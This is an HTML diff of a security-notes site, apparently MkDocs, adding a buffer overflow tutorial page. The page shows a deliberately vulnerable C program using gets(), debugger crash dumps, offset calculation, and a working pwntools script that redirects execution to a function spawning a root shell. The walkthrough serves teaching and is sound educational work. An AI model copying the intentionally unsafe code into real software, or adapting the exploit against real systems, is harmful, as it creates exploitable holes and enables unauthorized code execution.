@@ -1241,7 +1241,7 @@
         
   
   <span class="md-ellipsis">
-    web cache poisoning
+    web cache poisoning (PT-BR)
     
   </span>
   
@@ -2719,6 +2719,97 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1_3" id="__nav_6_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    writeups carnavown
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            writeups carnavown
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/hc/imetrics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Imetrics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/hc/iapi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Iapi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -3379,6 +3470,28 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ttricks/aws/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    aws cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -3593,7 +3706,169 @@
 
   <h1>buffer overflow</h1>
 
+<p><div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
 
+<span class="kt">void</span><span class="w"> </span><span class="nf">pwn</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] name: &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] hello, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// gcc test.c -o test -std=c99 -z execstack -no-pie</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="m">0000000000401156</span><span class="w"> </span>&lt;pwn&gt;:
+<span class="w">  </span><span class="m">401156</span>:<span class="w">    </span><span class="m">55</span><span class="w">                       </span>push<span class="w">   </span>%rbp
+<span class="w">  </span><span class="m">401157</span>:<span class="w">    </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span>e5<span class="w">                 </span>mov<span class="w">    </span>%rsp,%rbp
+<span class="w">  </span>40115a:<span class="w">    </span><span class="m">48</span><span class="w"> </span>8d<span class="w"> </span><span class="m">05</span><span class="w"> </span>a3<span class="w"> </span>0e<span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">     </span>lea<span class="w">    </span>0xea3<span class="o">(</span>%rip<span class="o">)</span>,%rax<span class="w">        </span><span class="c1"># 402004 &lt;_IO_stdin_used+0x4&gt;</span>
+<span class="w">  </span><span class="m">401161</span>:<span class="w">    </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span>c7<span class="w">                 </span>mov<span class="w">    </span>%rax,%rdi
+<span class="w">  </span><span class="m">401164</span>:<span class="w">    </span>e8<span class="w"> </span>d7<span class="w"> </span>fe<span class="w"> </span>ff<span class="w"> </span>ff<span class="w">           </span>call<span class="w">   </span><span class="m">401040</span><span class="w"> </span>&lt;system@plt&gt;
+<span class="w">  </span><span class="m">401169</span>:<span class="w">    </span><span class="m">90</span><span class="w">                       </span>nop
+<span class="w">  </span>40116a:<span class="w">    </span>5d<span class="w">                       </span>pop<span class="w">    </span>%rbp
+<span class="w">  </span>40116b:<span class="w">    </span>c3<span class="w">                       </span>ret
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>root@fsociety:~/bof#<span class="w"> </span>./test<span class="w"> </span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>name:<span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>hello,<span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation<span class="w"> </span>fault
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>root@fsociety:~/bof#<span class="w"> </span>pwn<span class="w"> </span>cyclic<span class="w"> </span><span class="m">100</span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/root/bof/test<span class="w"> </span>
+<span class="o">[</span>Thread<span class="w"> </span>debugging<span class="w"> </span>using<span class="w"> </span>libthread_db<span class="w"> </span>enabled<span class="o">]</span>
+Using<span class="w"> </span>host<span class="w"> </span>libthread_db<span class="w"> </span>library<span class="w"> </span><span class="s2">&quot;/usr/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>name:<span class="w"> </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>hello,<span class="w"> </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x00000000004011c9<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">()</span>
+LEGEND:<span class="w"> </span>STACK<span class="w"> </span><span class="p">|</span><span class="w"> </span>HEAP<span class="w"> </span><span class="p">|</span><span class="w"> </span>CODE<span class="w"> </span><span class="p">|</span><span class="w"> </span>DATA<span class="w"> </span><span class="p">|</span><span class="w"> </span>WX<span class="w"> </span><span class="p">|</span><span class="w"> </span>RODATA
+────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>REGISTERS<span class="w"> </span>/<span class="w"> </span>show-flags<span class="w"> </span>off<span class="w"> </span>/<span class="w"> </span>show-compact-regs<span class="w"> </span>off<span class="w"> </span><span class="o">]</span>─────────────────────────────────────────────────────
+<span class="w"> </span>RAX<span class="w">  </span><span class="m">0</span>
+<span class="w"> </span>RBX<span class="w">  </span>0x7fffffffdbc8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf72<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;/root/bof/test&#39;</span>
+<span class="w"> </span>RCX<span class="w">  </span><span class="m">6</span>
+<span class="w"> </span>RDX<span class="w">  </span>0x7ffff7e17790<span class="w"> </span><span class="o">(</span>_IO_stdfile_1_lock<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span><span class="m">0</span>
+<span class="w"> </span>RDI<span class="w">  </span>0x405310<span class="w"> </span>◂—<span class="w"> </span>0x405
+<span class="w"> </span>RSI<span class="w">  </span>0x405010<span class="w"> </span>◂—<span class="w"> </span>0x7000700070007
+<span class="w"> </span>R8<span class="w">   </span>0xffffffff
+<span class="w"> </span>R9<span class="w">   </span>0x411
+<span class="w"> </span>R10<span class="w">  </span>0xa102d5a56a633b90
+<span class="w"> </span>R11<span class="w">  </span>0x7ffff7c882e0<span class="w"> </span><span class="o">(</span>setbuf<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>mov<span class="w"> </span>edx,<span class="w"> </span>0x2000
+<span class="w"> </span>R12<span class="w">  </span><span class="m">0</span>
+<span class="w"> </span>R13<span class="w">  </span>0x7fffffffdbd8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf81<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;SHELL=/bin/bash&#39;</span>
+<span class="w"> </span>R14<span class="w">  </span>0x7ffff7ffd000<span class="w"> </span><span class="o">(</span>_rtld_global<span class="o">)</span><span class="w"> </span>—▸<span class="w"> </span>0x7ffff7ffe2f0<span class="w"> </span>◂—<span class="w"> </span><span class="m">0</span>
+<span class="w"> </span>R15<span class="w">  </span>0x403e00<span class="w"> </span><span class="o">(</span>__do_global_dtors_aux_fini_array_entry<span class="o">)</span><span class="w"> </span>—▸<span class="w"> </span>0x401120<span class="w"> </span><span class="o">(</span>__do_global_dtors_aux<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>endbr64<span class="w"> </span>
+<span class="w"> </span>RBP<span class="w">  </span>0x6161617261616171<span class="w"> </span><span class="o">(</span><span class="s1">&#39;qaaaraaa&#39;</span><span class="o">)</span>
+<span class="w"> </span>RSP<span class="w">  </span>0x7fffffffdab8<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;saaataaauaaavaaawaaaxaaayaaa&#39;</span>
+<span class="w"> </span>RIP<span class="w">  </span>0x4011c9<span class="w"> </span><span class="o">(</span>main+93<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>ret<span class="w"> </span>
+─────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>DISASM<span class="w"> </span>/<span class="w"> </span>x86-64<span class="w"> </span>/<span class="w"> </span><span class="nb">set</span><span class="w"> </span>emulate<span class="w"> </span>on<span class="w"> </span><span class="o">]</span>──────────────────────────────────────────────────────────────
+<span class="w"> </span>►<span class="w"> </span>0x4011c9<span class="w"> </span>&lt;main+93&gt;<span class="w">    </span>ret<span class="w">                                </span>&lt;0x6161617461616173&gt;
+<span class="w">    </span>↓
+
+
+
+
+
+
+
+
+
+───────────────────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>STACK<span class="w"> </span><span class="o">]</span>───────────────────────────────────────────────────────────────────────────
+<span class="m">00</span>:0000│<span class="w"> </span>rsp<span class="w"> </span>0x7fffffffdab8<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;saaataaauaaavaaawaaaxaaayaaa&#39;</span>
+<span class="m">01</span>:0008│<span class="w">     </span>0x7fffffffdac0<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;uaaavaaawaaaxaaayaaa&#39;</span>
+<span class="m">02</span>:0010│<span class="w">     </span>0x7fffffffdac8<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;waaaxaaayaaa&#39;</span>
+<span class="m">03</span>:0018│<span class="w">     </span>0x7fffffffdad0<span class="w"> </span>◂—<span class="w"> </span>0x61616179<span class="w"> </span>/*<span class="w"> </span><span class="s1">&#39;yaaa&#39;</span><span class="w"> </span>*/
+<span class="m">04</span>:0020│<span class="w">     </span>0x7fffffffdad8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdbc8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf72<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;/root/bof/test&#39;</span>
+<span class="m">05</span>:0028│<span class="w">     </span>0x7fffffffdae0<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdbc8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf72<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;/root/bof/test&#39;</span>
+<span class="m">06</span>:0030│<span class="w">     </span>0x7fffffffdae8<span class="w"> </span>◂—<span class="w"> </span>0xa1a42c58e3625700
+<span class="m">07</span>:0038│<span class="w">     </span>0x7fffffffdaf0<span class="w"> </span>◂—<span class="w"> </span><span class="m">0</span>
+─────────────────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>BACKTRACE<span class="w"> </span><span class="o">]</span>─────────────────────────────────────────────────────────────────────────
+<span class="w"> </span>►<span class="w"> </span><span class="m">0</span><span class="w">         </span>0x4011c9<span class="w"> </span>main+93
+<span class="w">   </span><span class="m">1</span><span class="w"> </span>0x6161617461616173<span class="w"> </span>None
+<span class="w">   </span><span class="m">2</span><span class="w"> </span>0x6161617661616175<span class="w"> </span>None
+<span class="w">   </span><span class="m">3</span><span class="w"> </span>0x6161617861616177<span class="w"> </span>None
+<span class="w">   </span><span class="m">4</span><span class="w">       </span>0x61616179<span class="w"> </span>None
+<span class="w">   </span><span class="m">5</span><span class="w">   </span>0x7fffffffdbc8<span class="w"> </span>None
+<span class="w">   </span><span class="m">6</span><span class="w">   </span>0x7fffffffdbc8<span class="w"> </span>None
+<span class="w">   </span><span class="m">7</span><span class="w"> </span>0xa1a42c58e3625700<span class="w"> </span>None
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>root@fsociety:~/bof#<span class="w"> </span>pwn<span class="w"> </span>cyclic<span class="w"> </span>-l<span class="w"> </span>saaataaa
+<span class="m">72</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/root/bof/test<span class="w"> </span>
+<span class="o">[</span>Thread<span class="w"> </span>debugging<span class="w"> </span>using<span class="w"> </span>libthread_db<span class="w"> </span>enabled<span class="o">]</span>
+Using<span class="w"> </span>host<span class="w"> </span>libthread_db<span class="w"> </span>library<span class="w"> </span><span class="s2">&quot;/usr/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>name:<span class="w"> </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaaBBBBBBBB
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>hello,<span class="w"> </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaaBBBBBBBB
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x00000000004011c9<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">()</span>
+LEGEND:<span class="w"> </span>STACK<span class="w"> </span><span class="p">|</span><span class="w"> </span>HEAP<span class="w"> </span><span class="p">|</span><span class="w"> </span>CODE<span class="w"> </span><span class="p">|</span><span class="w"> </span>DATA<span class="w"> </span><span class="p">|</span><span class="w"> </span>WX<span class="w"> </span><span class="p">|</span><span class="w"> </span>RODATA
+────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>REGISTERS<span class="w"> </span>/<span class="w"> </span>show-flags<span class="w"> </span>off<span class="w"> </span>/<span class="w"> </span>show-compact-regs<span class="w"> </span>off<span class="w"> </span><span class="o">]</span>─────────────────────────────────────────────────────
+<span class="w"> </span>RAX<span class="w">  </span><span class="m">0</span>
+<span class="w"> </span>RBX<span class="w">  </span>0x7fffffffdbc8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf72<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;/root/bof/test&#39;</span>
+<span class="w"> </span>RCX<span class="w">  </span><span class="m">6</span>
+<span class="w"> </span>RDX<span class="w">  </span>0x7ffff7e17790<span class="w"> </span><span class="o">(</span>_IO_stdfile_1_lock<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span><span class="m">0</span>
+<span class="w"> </span>RDI<span class="w">  </span>0x405310<span class="w"> </span>◂—<span class="w"> </span>0x405
+<span class="w"> </span>RSI<span class="w">  </span>0x405010<span class="w"> </span>◂—<span class="w"> </span>0x7000700070007
+<span class="w"> </span>R8<span class="w">   </span>0xffffffff
+<span class="w"> </span>R9<span class="w">   </span>0x411
+<span class="w"> </span>R10<span class="w">  </span>0x938b1325fdb70812
+<span class="w"> </span>R11<span class="w">  </span>0x7ffff7c882e0<span class="w"> </span><span class="o">(</span>setbuf<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>mov<span class="w"> </span>edx,<span class="w"> </span>0x2000
+<span class="w"> </span>R12<span class="w">  </span><span class="m">0</span>
+<span class="w"> </span>R13<span class="w">  </span>0x7fffffffdbd8<span class="w"> </span>—▸<span class="w"> </span>0x7fffffffdf81<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;SHELL=/bin/bash&#39;</span>
+<span class="w"> </span>R14<span class="w">  </span>0x7ffff7ffd000<span class="w"> </span><span class="o">(</span>_rtld_global<span class="o">)</span><span class="w"> </span>—▸<span class="w"> </span>0x7ffff7ffe2f0<span class="w"> </span>◂—<span class="w"> </span><span class="m">0</span>
+<span class="w"> </span>R15<span class="w">  </span>0x403e00<span class="w"> </span><span class="o">(</span>__do_global_dtors_aux_fini_array_entry<span class="o">)</span><span class="w"> </span>—▸<span class="w"> </span>0x401120<span class="w"> </span><span class="o">(</span>__do_global_dtors_aux<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>endbr64<span class="w"> </span>
+<span class="w"> </span>RBP<span class="w">  </span>0x6161617261616171<span class="w"> </span><span class="o">(</span><span class="s1">&#39;qaaaraaa&#39;</span><span class="o">)</span>
+<span class="w"> </span>RSP<span class="w">  </span>0x7fffffffdab8<span class="w"> </span>◂—<span class="w"> </span><span class="s1">&#39;BBBBBBBB&#39;</span>
+<span class="w"> </span>RIP<span class="w">  </span>0x4011c9<span class="w"> </span><span class="o">(</span>main+93<span class="o">)</span><span class="w"> </span>◂—<span class="w"> </span>ret<span class="w"> </span>
+─────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>DISASM<span class="w"> </span>/<span class="w"> </span>x86-64<span class="w"> </span>/<span class="w"> </span><span class="nb">set</span><span class="w"> </span>emulate<span class="w"> </span>on<span class="w"> </span><span class="o">]</span>──────────────────────────────────────────────────────────────
+<span class="w"> </span>►<span class="w"> </span>0x4011c9<span class="w"> </span>&lt;main+93&gt;<span class="w">    </span>ret<span class="w">                                </span>&lt;0x4242424242424242&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>root@fsociety:~/bof#<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>./test<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>ret
+<span class="w">  </span><span class="m">401016</span>:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>4010a0:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>4010d0:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span><span class="m">401110</span>:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>40113e:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span><span class="m">401140</span>:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>40116b:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>4011c9:<span class="w">    </span>c3<span class="w">                       </span>ret
+<span class="w">  </span>4011d4:<span class="w">    </span>c3<span class="w">                       </span>ret
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">pwn_addr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x56\x11\x40\x00\x00\x00\x00\x00</span><span class="s2">&quot;</span>
+<span class="n">ret</span>      <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc9\x11\x40\x00\x00\x00\x00\x00</span><span class="s2">&quot;</span> <span class="c1"># alignment</span>
+<span class="n">nops</span>     <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span>
+<span class="n">offset</span>   <span class="o">=</span> <span class="mi">72</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./test&quot;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">offset</span> <span class="o">*</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">pwn_addr</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>root@fsociety:~/bof#<span class="w"> </span>python3<span class="w"> </span>xpl.py<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>process<span class="w"> </span><span class="s1">&#39;./test&#39;</span>:<span class="w"> </span>pid<span class="w"> </span><span class="m">20035</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>name:<span class="w"> </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>hello,<span class="w"> </span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span><span class="m">90</span><span class="se">\x</span>c9<span class="se">\x</span><span class="m">11</span>@
+$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+$<span class="w"> </span>whoami
+root
+</code></pre></div></p>
 
 
 
